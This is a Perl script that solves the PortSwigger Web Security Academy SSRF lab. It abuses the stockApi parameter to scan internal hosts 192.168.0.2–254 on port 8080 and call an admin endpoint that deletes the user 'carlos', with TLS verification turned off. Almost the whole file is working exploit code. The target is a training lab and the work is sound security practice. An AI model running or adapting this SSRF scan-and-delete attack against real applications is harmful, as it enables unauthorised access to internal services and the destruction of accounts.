#!/usr/bin/env perl
#
#   Author: <wexe1@protonmail.com>
#   License: MIT
#
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::CookieJar::LWP;
use URI::Encode qw(uri_encode);
use Getopt::Long;
use Pod::Usage;
use feature 'say';
use Term::ANSIColor;

sub makeRequest($);

BEGIN {
    say colored("PortSwigger Web Security Academy", "bold yellow");
    say colored("Lab: Basic SSRF against another back-end system", "bold yellow");
    say colored("Solution by weXe1", "bold blue");
    print "\n";
}

our $| = 1;

our(
    $url,
    $proxy,
    $help,
);

GetOptions(
    'u|url=s'           => \$url,
    'p|proxy=s'         => \$proxy,
    'h|help'            => \$help
);

pod2usage(1) if $help;
pod2usage(1) unless $url;

our $ua = LWP::UserAgent->new(
    protocols_allowed   => ['http', 'https']
);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

if ($proxy) {
    $ua->proxy('https' => $proxy);
    $ua->proxy('http' => $proxy);
}

$url =~ s/(\/)$//;
$url .= '/product/stock';

say colored("[*] Obtaining admin interface for $url", "cyan");
for my $h (2..254) {
    if (&makeRequest($h)) {
        say colored("[+] Found: http://192.168.0.$h:8080/admin", "green");
        exit
    }
}

say colored("[-] Cannot obtain admin interface", "red");

sub makeRequest($) {
    my $host = shift;
    
    my $stockApi = uri_encode("http://192.168.0.$host:8080/admin/delete?username=carlos");

    my $response = $ua->post($url, {stockApi => $stockApi});

    return ($response->is_success || $response->status_line =~ /302 found/i) ? 1 : 0;
}

__END__

=head1 SYNOPSIS

 $ perl basic-ssrf-another-system.pl [options]

=head1 OPTIONS

     --url=<URL>                Target URL of the lab (required)
     --proxy=<URL>              HTTP or HTTPS proxy URL (optional)
     --help                     Prints this help and exit

=cut